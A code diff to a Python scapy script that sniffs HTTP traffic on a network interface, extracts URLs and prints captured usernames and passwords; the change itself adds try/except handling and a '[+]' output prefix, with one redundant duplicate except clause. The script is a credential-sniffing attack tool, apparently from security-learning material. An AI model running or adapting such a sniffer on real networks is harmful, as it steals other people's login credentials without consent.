@@ -8,12 +8,22 @@ from scapy.layers import http
     from scapy and pass the callback function to itto process the 
     captured packet '''
 def sniff(interface):
-    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    try:
+        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    except KeyboardInterrupt:
+        return
+    except Exception as e:
+        print(f"Something went wrong... {e}")
 
 
 # Gets url from packet
 def getUrl(packet):
-    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    try:
+        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    except Exception as e:
+        print(f"Error while extracting url from packet... {e}")
+    except Exception as e:
+        print(f"Something went wrong... {e}")
 
 
 # Extracts login information
@@ -34,12 +44,17 @@ def process_sniffed_packet(packet):
 
     login_info = extractLoginInfo(packet)
     if login_info:
-        print(f"\n\n Username and Password ->> {login_info}\n\n")
+        print(f"\n\n[+] Username and Password ->> {login_info}\n\n")
 
    
 # Calls sniff funciton
 def start_sniff(interface):
-    sniff(interface)
+    try:
+        sniff(interface)
+    except KeyboardInterrupt:
+        return
+    except Exception as e:
+        print(f"Something went wrong... {e}")
 
 
 if __name__ == "__main__":
